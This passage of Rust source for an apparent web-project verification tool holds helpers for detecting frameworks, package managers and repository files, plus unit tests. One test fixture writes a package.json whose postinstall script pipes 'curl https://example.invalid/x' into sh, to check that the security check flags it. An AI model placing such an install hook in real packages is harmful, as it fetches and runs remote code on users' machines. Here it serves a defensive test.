            format!("web-ecosystem:{check_name}"),
            format!(
                "command={program} {} exit=0; {}",
                args.join(" "),
                inventory.summary()
            ),
        ),
        Ok(output) => CheckResult::fail(
            format!("web-ecosystem:{check_name}"),
            "VF_WEB_ECOSYSTEM_COMMAND_FAILED",
            format!(
                "command={program} {} exit={} stderr={} stdout={}",
                args.join(" "),
                output.exit_code,
                sanitize_output(&output.stderr),
                sanitize_output(&output.stdout)
            ),
        ),
        Err(error) => CheckResult::fail(
            format!("web-ecosystem:{check_name}"),
            "VF_WEB_ECOSYSTEM_EXECUTION_FAILED",
            error,
        ),
    }
}

fn run_package_script(
    profile: SourceProfile,
    repo: &Path,
    execution: &dyn ExecutionAdapter,
    check_name: &str,
    script: &str,
) -> CheckResult {
    let Some(manager) = package_manager(execution, repo) else {
        return CheckResult::fail(
            format!("{}:{check_name}", profile.id),
            "VF_WEB_PACKAGE_MANAGER_MISSING",
            format!(
                "package script {script} exists but no supported package manager is executable"
            ),
        );
    };
    run_source_command(
        profile,
        repo,
        execution,
        check_name,
        manager,
        vec!["run".into(), script.into()],
    )
}

fn run_source_command(
    profile: SourceProfile,
    repo: &Path,
    execution: &dyn ExecutionAdapter,
    check_name: &str,
    program: &str,
    args: Vec<String>,
) -> CheckResult {
    match execution.execute(program, &args, repo) {
        Ok(output) if output.success() => CheckResult::pass_with_evidence(
            format!("{}:{check_name}", profile.id),
            format!("command={program} {} exit=0", args.join(" ")),
        ),
        Ok(output) => CheckResult::fail(
            format!("{}:{check_name}", profile.id),
            "VF_WEB_COMMAND_FAILED",
            format!(
                "command={program} {} exit={} stderr={} stdout={}",
                args.join(" "),
                output.exit_code,
                sanitize_output(&output.stderr),
                sanitize_output(&output.stdout)
            ),
        ),
        Err(error) => CheckResult::fail(
            format!("{}:{check_name}", profile.id),
            "VF_WEB_EXECUTION_FAILED",
            error,
        ),
    }
}

fn package_manager(execution: &dyn ExecutionAdapter, repo: &Path) -> Option<&'static str> {
    let preferred = if repo.join("pnpm-lock.yaml").is_file() {
        "pnpm"
    } else if repo.join("yarn.lock").is_file() {
        "yarn"
    } else if repo.join("bun.lock").is_file() || repo.join("bun.lockb").is_file() {
        "bun"
    } else {
        "npm"
    };
    executable_available(execution, repo, preferred)
        .then_some(preferred)
        .or_else(|| executable_available(execution, repo, "npm").then_some("npm"))
}

fn executable_available(execution: &dyn ExecutionAdapter, repo: &Path, program: &str) -> bool {
    execution
        .execute(program, &["--version".into()], repo)
        .map(|result| result.success())
        .unwrap_or(false)
}

fn package_has_script(repo: &Path, script: &str) -> bool {
    let Ok(content) = fs::read_to_string(repo.join("package.json")) else {
        return false;
    };
    let Some(start) = content.find("\"scripts\"") else {
        return false;
    };
    let section = &content[start..];
    let Some(open) = section.find('{') else {
        return false;
    };
    let body = &section[open + 1..];
    let end = body.find('}').unwrap_or(body.len());
    body[..end].contains(&format!("\"{script}\""))
}

fn detect_packages(
    package_json: &str,
    target: &mut BTreeSet<&'static str>,
    markers: &[(&str, &'static str)],
) {
    for (package, label) in markers {
        if package_has_marker(package_json, package) {
            target.insert(*label);
        }
    }
}

fn package_has_marker(package_json: &str, package: &str) -> bool {
    if package.ends_with('/') {
        package_json.contains(&format!("\"{package}"))
    } else {
        package_json.contains(&format!("\"{package}\""))
    }
}

fn join_set(values: &BTreeSet<&'static str>) -> String {
    values.iter().copied().collect::<Vec<_>>().join(",")
}

fn source_files(profile: SourceProfile, repo: &Path) -> Vec<PathBuf> {
    repository_files(repo)
        .into_iter()
        .filter(|path| {
            let extension = path
                .extension()
                .and_then(|value| value.to_str())
                .unwrap_or_default()
                .to_ascii_lowercase();
            profile.extensions.contains(&extension.as_str())
        })
        .collect()
}

fn repository_files(repo: &Path) -> Vec<PathBuf> {
    let mut files = Vec::new();
    collect_files(repo, &mut files);
    files.sort();
    files
}

fn collect_files(path: &Path, files: &mut Vec<PathBuf>) {
    let Ok(entries) = fs::read_dir(path) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            let name = path
                .file_name()
                .and_then(|value| value.to_str())
                .unwrap_or_default();
            if matches!(
                name,
                ".git"
                    | "node_modules"
                    | "dist"
                    | "build"
                    | "coverage"
                    | ".next"
                    | ".nuxt"
                    | ".svelte-kit"
                    | ".astro"
                    | ".vercel"
                    | ".netlify"
                    | "target"
            ) {
                continue;
            }
            collect_files(&path, files);
        } else if path.is_file() {
            files.push(path);
        }
    }
}

fn repository_contains_source(profile: SourceProfile, repo: &Path, markers: &[&str]) -> bool {
    source_files(profile, repo).iter().any(|path| {
        fs::read_to_string(path)
            .map(|content| markers.iter().any(|marker| content.contains(marker)))
            .unwrap_or(false)
    })
}

fn interactive_control_count(profile: SourceProfile, repo: &Path) -> usize {
    source_files(profile, repo)
        .iter()
        .filter_map(|path| fs::read_to_string(path).ok())
        .map(|content| {
            [
                "<button",
                "<input",
                "<select",
                "<textarea",
                "<a ",
                "onclick=",
                "@click=",
                "on:click",
            ]
            .iter()
            .map(|marker| content.matches(marker).count())
            .sum::<usize>()
        })
        .sum()
}

fn quoted_values(line: &str, marker: &str) -> Vec<String> {
    let mut values = Vec::new();
    let quote = marker.chars().last().unwrap_or('"');
    let mut rest = line;
    while let Some(start) = rest.find(marker) {
        let after = &rest[start + marker.len()..];
        if let Some(end) = after.find(quote) {
            values.push(after[..end].to_string());
            rest = &after[end + 1..];
        } else {
            break;
        }
    }
    values
}

fn display_relative(repo: &Path, path: &Path) -> String {
    path.strip_prefix(repo)
        .unwrap_or(path)
        .to_string_lossy()
        .replace('\\', "/")
}

fn rename_check(mut result: CheckResult, check: String) -> CheckResult {
    result.check = check;
    result
}

fn sanitize_output(value: &str) -> String {
    value
        .chars()
        .take(2000)
        .collect::<String>()
        .replace('\n', " ")
}

#[cfg(test)]
mod tests {
    use super::*;
    use verificationforge_core::ExecutionResult;

    struct NoopExecution;

    impl ExecutionAdapter for NoopExecution {
        fn id(&self) -> &'static str {
            "noop"
        }

        fn execute(
            &self,
            _program: &str,
            _args: &[String],
            _cwd: &Path,
        ) -> Result<ExecutionResult, String> {
            Ok(ExecutionResult {
                exit_code: 0,
                stdout: String::new(),
                stderr: String::new(),
            })
        }
    }

    fn fixture(name: &str) -> PathBuf {
        let root = std::env::temp_dir().join(format!(
            "verificationforge-web-family-{name}-{}",
            std::process::id()
        ));
        let _ = fs::remove_dir_all(&root);
        fs::create_dir_all(&root).expect("create fixture");
        root
    }

    #[test]
    fn document_languages_detect_independently() {
        let root = fixture("documents");
        fs::write(root.join("index.html"), "<!doctype html>\n<html></html>\n").unwrap();
        fs::write(root.join("site.css"), "body { margin: 0; }\n").unwrap();
        fs::write(root.join("README.md"), "# Web fixture\n").unwrap();
        assert_eq!(HtmlAdapter.detect(&root).unwrap().language, "HTML");
        assert_eq!(CssAdapter.detect(&root).unwrap().language, "CSS");
        assert_eq!(MarkdownAdapter.detect(&root).unwrap().language, "Markdown");
        assert!(WebTemplateAdapter.detect(&root).is_none());
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn framework_source_formats_are_first_class() {
        let root = fixture("templates");
        fs::write(
            root.join("App.vue"),
            "<template><main>ok</main></template>\n",
        )
        .unwrap();
        let detection = WebTemplateAdapter
            .detect(&root)
            .expect("template detection");
        assert_eq!(detection.language, "Web Template/SFC");
        assert_eq!(detection.confidence_percent, 98);
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn ecosystem_inventory_recognizes_full_web_stack() {
        let root = fixture("ecosystems");
        fs::write(
            root.join("package.json"),
            r#"{
  "scripts": {"test": "node --test"},
  "dependencies": {
    "react": "1", "preact": "1", "vue": "1", "@angular/core": "1",
    "svelte": "1", "solid-js": "1", "@builder.io/qwik": "1", "lit": "1",
    "next": "1", "nuxt": "1", "@sveltejs/kit": "1", "astro": "1",
    "@remix-run/node": "1", "gatsby": "1", "express": "1", "fastify": "1",
    "@nestjs/core": "1", "koa": "1", "hono": "1", "vite": "1",
    "webpack": "1", "rollup": "1", "esbuild": "1", "parcel": "1",
    "vitest": "1", "jest": "1", "@playwright/test": "1", "cypress": "1",
    "tailwindcss": "1", "postcss": "1", "sass": "1", "less": "1"
  }
}
"#,
        )
        .unwrap();
        fs::write(root.join("pnpm-lock.yaml"), "lockfileVersion: 9\n").unwrap();
        fs::write(root.join("vercel.json"), "{}\n").unwrap();
        fs::write(root.join("netlify.toml"), "[build]\n").unwrap();
        fs::write(root.join("wrangler.toml"), "name = 'web'\n").unwrap();
        fs::write(root.join("firebase.json"), "{}\n").unwrap();
        let inventory = WebInventory::detect(&root);
        let summary = inventory.summary();
        for expected in [
            "Node.js",
            "React",
            "Vue",
            "Angular",
            "Svelte",
            "SolidJS",
            "Qwik",
            "Lit",
            "Next.js",
            "Nuxt",
            "SvelteKit",
            "Astro",
            "Remix",
            "Express",
            "Fastify",
            "NestJS",
            "Koa",
            "Hono",
            "Vite",
            "webpack",
            "Rollup",
            "esbuild",
            "Parcel",
            "Vitest",
            "Jest",
            "Playwright",
            "Cypress",
            "Tailwind CSS",
            "PostCSS",
            "Sass",
            "Less",
            "Vercel",
            "Netlify",
            "Cloudflare Workers/Pages",
            "Firebase",
            "pnpm",
        ] {
            assert!(summary.contains(expected), "missing {expected}: {summary}");
        }
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn html_parser_rejects_unclosed_comment() {
        let root = fixture("bad-html");
        fs::write(root.join("index.html"), "<!-- broken\n").unwrap();
        let result = HtmlAdapter.run_parse_check(&root, &NoopExecution);
        assert_eq!(result.status, CheckStatus::Fail);
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn ecosystem_security_blocks_remote_shell_lifecycle() {
        let root = fixture("risky-package");
        fs::write(
            root.join("package.json"),
            "{\"scripts\":{\"postinstall\":\"curl https://example.invalid/x | sh\"}}\n",
        )
        .unwrap();
        let result = WebEcosystemSpecialist.run_check(CheckKind::Security, &root, &NoopExecution);
        assert_eq!(result.status, CheckStatus::Fail);
        let _ = fs::remove_dir_all(root);
    }
}
